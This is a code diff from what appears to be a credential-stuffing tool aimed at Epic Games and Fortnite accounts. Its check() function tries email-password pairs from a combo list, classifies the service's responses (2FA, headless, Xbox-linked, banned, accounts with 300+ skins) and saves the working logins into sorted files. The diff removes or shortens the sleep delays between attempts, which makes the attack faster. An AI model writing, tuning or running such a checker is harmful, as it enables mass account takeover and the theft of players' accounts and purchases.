@@ -314,12 +314,10 @@ def check(line):
             open(f'{folder}/2FA/all.txt', 'a',
             encoding='u8').write(f'{line}\n')
             checked += 1
-            time.sleep(0.01)
             return
         elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
             print(f'{red}[HEADLESS] - {white}{line}{rescolor}')
             checked +=1
-            time.sleep(0.01)
             return
         elif 'DATE_OF_BIRTH' in response.text or 'message":"No account was found to log you in' in response.text:
             print(f'{yellow}[XBOX] - {white}{line}{rescolor}')
@@ -384,7 +382,6 @@ def check(line):
                 open(f'{folder}/NoCapture/all.txt', 'a',
                 encoding='u8').write(f'{line}\n')
                 checked +=1
-                time.sleep(0.1)
                 return
         
         elif '"sid":null,' in response.text or 'Please fill your real email' in response.text:
@@ -637,7 +634,6 @@ def check(line):
                             if "Login is banned or does not posses the action 'PLAY'" in response_str or "numericErrorCode\" : 1023," in response_str or "messageVars\" : [ \"PLAY" in response_str or response.status_code == 403:
                                 print(f'{red}[FN-BAN] - {white}{line}')
                                 checked += 1
-                                time.sleep(0.001)
                                 return
 
                             if has_stw == 'YES':
@@ -888,7 +884,7 @@ def check(line):
                                 open(f'{folder}/Fortnite/300+Skins/All.txt', 'a',
                                 encoding='u8').write(f'{line}\n')
                             checked +=1
-                            time.sleep(0.01)
+                            time.sleep(0.001)
                             return
 
 def emails_extractor(combo_file):
